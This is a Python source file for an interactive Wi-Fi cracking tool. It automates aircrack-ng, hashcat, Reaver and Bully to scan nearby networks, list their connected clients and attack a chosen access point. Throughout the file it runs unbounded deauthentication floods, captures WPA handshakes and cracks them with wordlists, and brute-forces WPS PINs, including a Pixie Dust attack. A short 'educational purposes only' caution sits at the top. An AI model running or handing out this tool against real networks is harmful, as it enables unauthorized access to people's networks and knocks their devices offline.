import os
import subprocess
import time
import logging
from colorama import Fore, Style, init
from tqdm import tqdm
from manuf import manuf
from tabulate import tabulate

# Initialize colorama and logging
init(autoreset=True)
logging.basicConfig(filename='wifi_cracker.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Display caution and license agreement
print(Fore.YELLOW + "Caution: This tool is intended for educational purposes only. Unauthorized use may violate applicable law. Use responsibly and respect privacy.")
license_text = """
{green}MIT License

Copyright (c) 2024 by Eudes Charles

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
""".format(green=Fore.GREEN)
print(license_text)

# License agreement prompt
read_license = input("Have you read the license? ({green}yes{reset}/{red}no{reset}): ".format(green=Fore.GREEN, red=Fore.RED, reset=Style.RESET_ALL)).strip().lower()
while read_license != 'yes':
    print(license_text)
    read_license = input("Have you read the license now? ({green}yes{reset}/{red}no{reset}): ".format(green=Fore.GREEN, red=Fore.RED, reset=Style.RESET_ALL)).strip().lower()
understand_agree = input("Do you understand and agree with the license? ({green}yes{reset}/{red}no{reset}): ".format(green=Fore.GREEN, red=Fore.RED, reset=Style.RESET_ALL)).strip().lower()
if understand_agree != 'yes':
    print(Fore.RED + "You must agree to the license to use this tool. Exiting.")
    exit(1)

# Clear the screen
os.system('cls' if os.name == 'nt' else 'clear')

# Function to run a terminal command and capture its output
def run_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    logging.info(f"Command: {command}\nOutput: {result.stdout}\nError: {result.stderr}")
    return result.stdout, result.stderr

# Ensure the script is run as root
def check_root():
    if os.geteuid() != 0:
        print(Fore.RED + "This script must be run as root.")
        logging.error("Please run the script as root.")
        exit(1)

# Display script introduction
def display_intro():
    intro = """
    ---------------------------------------------------------------------------------------
        ██╗    ██╗██╗███████╗██╗       ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
        ██║    ██║██║██╔════╝██║      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
        ██║ █╗ ██║██║█████╗  ██║█████╗██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
        ██║███╗██║██║██╔══╝  ██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
        ╚███╔███╔╝██║██║     ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
        ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═════╝╚═╝  ╚╝╚══════╝╚═╝  ╚═╝
                                                                        Coded By Eudes(v 1.0)
    ---------------------------------------------------------------------------------------
    """
    print(Fore.GREEN + intro)
    logging.info("Displayed intro.")
    time.sleep(3)

# Check and install required tools
def check_and_install_requirements():
    required_tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng', 'hashcat', 'crunch', 'cap2hccapx.bin', 'reaver', 'bettercap', 'bully']
    missing_tools = []

    for tool in required_tools:
        out, err = run_command(f"which {tool}")
        if not out.strip():
            missing_tools.append(tool)
    
    if missing_tools:
        print(Fore.YELLOW + "The following tools are missing and will be installed: " + ", ".join(missing_tools))
        for tool in tqdm(missing_tools, desc="Installing tools"):
            if tool in ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng']:
                run_command("apt-get update && apt-get install -y aircrack-ng")
            elif tool == 'hashcat':
                run_command("apt-get update && apt-get install -y hashcat")
            elif tool == 'crunch':
                run_command("apt-get update && apt-get install -y crunch")
            elif tool == 'cap2hccapx.bin':
                run_command("apt-get update && apt-get install -y hashcat-utils")
            elif tool == 'reaver':
                run_command("apt-get update && apt-get install -y reaver")
            elif tool == 'bettercap':
                run_command("apt-get update && apt-get install -y bettercap")
            elif tool == 'bully':
                run_command("apt-get update && apt-get install -y bully")
        
        print(Fore.GREEN + "All required tools are installed.")
    else:
        print(Fore.GREEN + "All required tools are already installed.")

# Find available wordlists in common directories
def find_wordlists():
    wordlist_directories = [
        "/usr/share/wordlists/",
        "/path/to/custom/wordlists/",
    ]
    wordlists = []
    for directory in wordlist_directories:
        if os.path.isdir(directory):
            files = os.listdir(directory)
            wordlists.extend([os.path.join(directory, file) for file in files if file.endswith('.txt')])
    return wordlists

# Tools with bundled wordlists
def find_tools_with_wordlists():
    tools_with_wordlists = {
        "hashcat": ["rockyou.txt", "passwords.txt"],
        "john": ["english.txt", "common.txt"],
    }
    return tools_with_wordlists

# Create a custom random wordlist using crunch
def create_random_wordlist():
    print(Fore.CYAN + "Creating a custom random wordlist with crunch.")
    min_length = input(Fore.CYAN + "Enter minimum password length: ").strip()
    max_length = input(Fore.CYAN + "Enter maximum password length: ").strip()
    characters = input(Fore.CYAN + "Enter characters to include (e.g., abc123!@#): ").strip()
    wordlist_path = input(Fore.CYAN + "Enter output path for the wordlist: ").strip()

    run_command(f"crunch {min_length} {max_length} {characters} -o {wordlist_path}")
    print(Fore.GREEN + f"Custom wordlist created at {wordlist_path}")

# Enable monitor mode on the Wi-Fi adapter
def enable_monitor_mode():
    print(Fore.YELLOW + "Enabling monitor mode on wlan0...")
    run_command("airmon-ng start wlan0")
    return True

# Get manufacturer information for a BSSID
def get_manufacturer(bssid):
    try:
        parser = manuf.MacParser()
        manufacturer = parser.get_manuf(bssid)
        return manufacturer if manufacturer else "Unknown"
    except:
        return "Unknown"

# Get users connected to a BSSID
def get_users(bssid):
    users = []
    try:
        with open(f"output-{bssid}-01.csv", "r") as file:
            for line in file:
                if bssid in line and "Station MAC" not in line:
                    users.append(line.split(",")[0].strip())
    except FileNotFoundError:
        logging.error(f"Users file for BSSID {bssid} not found.")
        pass
    
    return users

# Scan for Wi-Fi networks
def scan_networks():
    print(Fore.YELLOW + "Scanning for networks... (Press Ctrl+C to stop)")
    networks = []
    process = subprocess.Popen(['airodump-ng', 'wlan0mon'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    try:
        for output in process.stdout:
            output = output.decode("utf-8").strip("\n-8")
            if output.startswith(" BSSID"):
                continue
            parts = output.split()
            if len(parts) >= 14:
                bssid, pwr, beacons, data, channel, encryption, essid = parts[0], parts[3], parts[5], parts[6], parts[8], parts[13], ' '.join(parts[14:])
                networks.append({
                    "BSSID": bssid,
                    "PWR": pwr,
                    "Beacons": beacons,
                    "Data": data,
                    "Channel": channel,
                    "Encryption": encryption,
                    "ESSID": essid,
                    "Manufacturer": get_manufacturer(bssid),
                    "Users": get_users(bssid)
                })
    except KeyboardInterrupt:
        process.terminate()
        print(Fore.YELLOW + "Scan stopped. Processing results...")

    return networks

# Perform a deauthentication attack
def perform_deauthentication_attack(bssid, channel, essid):
    print(Fore.YELLOW + f"Starting deauthentication attack on {essid} ({bssid})...")
    run_command(f"airodump-ng --bssid {bssid} --channel {channel} --write output wlan0mon")
    print(Fore.YELLOW + f"Sending deauth packets to {essid} ({bssid})...")
    run_command(f"aireplay-ng --deauth 0 -a {bssid} wlan0mon")

# Capture a WPA handshake
def wpa_handshake_capture(bssid, channel, essid):
    print(Fore.YELLOW + f"Capturing WPA handshake for {essid} ({bssid}) on channel {channel}...")
    run_command(f"airodump-ng --bssid {bssid} --channel {channel} --write handshake wlan0mon")
    time.sleep(10)
    print(Fore.YELLOW + f"Sending deauth packets to {essid} ({bssid})...")
    run_command(f"aireplay-ng --deauth 0 -a {bssid} wlan0mon")

# Crack a captured WPA handshake
def crack_handshake(bssid, essid, wordlist):
    print(Fore.YELLOW + f"Converting .cap file to .hccapx format for {essid} ({bssid})...")
    run_command(f"cap2hccapx.bin handshake-01.cap handshake.hccapx")
    print(Fore.YELLOW + f"Attempting to crack WPA handshake for {essid} ({bssid}) using wordlist {wordlist} and hashcat...")
    run_command(f"hashcat -m 2500 -a 0 handshake.hccapx {wordlist}")

# Perform a Reaver attack
def reaver_attack(bssid, channel, essid):
    print(Fore.YELLOW + f"Starting Reaver attack on {essid} ({bssid}) on channel {channel}...")
    run_command(f"reaver -i wlan0mon -b {bssid} -c {channel} -vv")

# Perform a Bully attack
def bully_attack(bssid, channel, essid):
    print(Fore.YELLOW + f"Starting Bully attack on {essid} ({bssid}) on channel {channel}...")
    run_command(f"bully wlan0mon -b {bssid} -c {channel} -v 3")

# Perform a Pixie Dust attack
def pixie_dust_attack(bssid, channel, essid):
    print(Fore.YELLOW + f"Starting Pixie Dust attack on {essid} ({bssid}) on channel {channel}...")
    run_command(f"reaver -i wlan0mon -b {bssid} -c {channel} -vv -K 1")

# Main function to run the script
def main():
    check_root()
    display_intro()
    check_and_install_requirements()

    wordlists = find_wordlists()
    tools_with_wordlists = find_tools_with_wordlists()
    
    if not enable_monitor_mode():
        print(Fore.RED + "Monitor mode is required to continue. Exiting.")
        logging.error("Monitor mode is required to continue. Exiting.")
        exit(1)

    create_custom_wordlist = input(Fore.CYAN + "Would you like to create a custom random wordlist? (yes/no): ").strip().lower()
    if create_custom_wordlist == 'yes':
        create_random_wordlist()

    networks = scan_networks()
    print(tabulate(networks, headers="keys"))
    
    bssid = input(Fore.CYAN + "Enter the BSSID of the network to attack: ").strip()
    channel = input(Fore.CYAN + "Enter the channel of the network: ").strip()
    essid = input(Fore.CYAN + "Enter the ESSID of the network: ").strip()

    attack_choice = input(Fore.CYAN + "Choose attack type (1 - Deauth, 2 - WPA Handshake, 3 - Reaver, 4 - Bully, 5 - Pixie Dust): ").strip()
    
    if attack_choice == '1':
        perform_deauthentication_attack(bssid, channel, essid)
    elif attack_choice == '2':
        wordlist = input(Fore.CYAN + "Enter the path to the wordlist for cracking: ").strip()
        wpa_handshake_capture(bssid, channel, essid)
        crack_handshake(bssid, essid, wordlist)
    elif attack_choice == '3':
        reaver_attack(bssid, channel, essid)
    elif attack_choice == '4':
        bully_attack(bssid, channel, essid)
    elif attack_choice == '5':
        pixie_dust_attack(bssid, channel, essid)
    else:
        print(Fore.RED + "Invalid choice. Exiting.")
        logging.error("Invalid attack choice. Exiting.")
        exit(1)

if __name__ == "__main__":
    main()
